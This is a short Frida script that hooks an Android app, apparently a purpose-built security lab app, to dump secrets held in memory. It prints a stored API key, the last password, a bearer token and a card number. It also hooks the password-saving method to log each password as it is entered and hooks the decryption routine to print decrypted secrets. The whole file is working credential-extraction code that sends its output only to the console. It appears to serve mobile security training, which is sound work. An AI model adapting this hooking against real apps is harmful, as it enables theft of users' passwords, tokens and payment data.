Java.perform(function () {
  var Store = Java.use("vn.hvktmm.bach.securitylab.security.SensitiveStore");
  try { console.log("[MOBILAB] summary=" + Store.getSensitiveSummary()); } catch (e) { console.log(e); }
  try { console.log("[MOBILAB] apiKey=" + Store.apiKey.value); } catch (e) {}
  try { console.log("[MOBILAB] password=" + Store.lastPassword.value); } catch (e) {}
  try { console.log("[MOBILAB] token=" + Store.bearerToken.value); } catch (e) {}
  try { console.log("[MOBILAB] card=" + Store.cardNumber.value); } catch (e) {}
  try {
    var rememberPassword = Store.rememberPassword.overload("java.lang.String");
    rememberPassword.implementation = function (password) {
      console.log("[MOBILAB] password observed=" + password);
      return rememberPassword.call(this, password);
    };
  } catch (e) { console.log("[MOBILAB] password hook unavailable"); }
  var Crypto = Java.use("vn.hvktmm.bach.securitylab.crypto.CryptoManager");
  var originalDecrypt = Crypto.decryptSecret;
  Crypto.decryptSecret.implementation = function () {
    var secret = originalDecrypt.call(this);
    console.log("[MOBILAB] decrypted secret=" + secret);
    return secret;
  };
});
